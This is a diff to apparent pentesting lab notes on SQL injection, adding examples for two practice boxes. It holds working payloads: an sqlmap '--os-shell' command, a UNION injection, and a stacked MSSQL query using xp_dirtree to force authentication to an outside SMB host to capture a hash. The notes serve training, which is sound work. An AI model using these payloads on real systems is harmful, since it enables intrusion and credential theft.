@@ -58,6 +58,7 @@ sqlmap -r tosql --os-shell
 ## Examples
 
 ### Union box
+linux running mysql
 
 ![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/df9e7367-c6f6-4ecb-a3cc-4adecc5d4682)
 
@@ -67,8 +68,16 @@ sqlmap -r tosql --os-shell
 ' UNION select user();-- -
 ```
 
+### Giddy
+windows mssql
+use ; to chain a command to get a responder hash
+
+![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1543d681-30ec-454f-89d8-f3435f5e9d2a)
 
 
+```
+https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.14\vivig%22;%20--
+```
 ## CheatSheet
 More comprehensive can be found Payloadallthethings
 SQL Injection
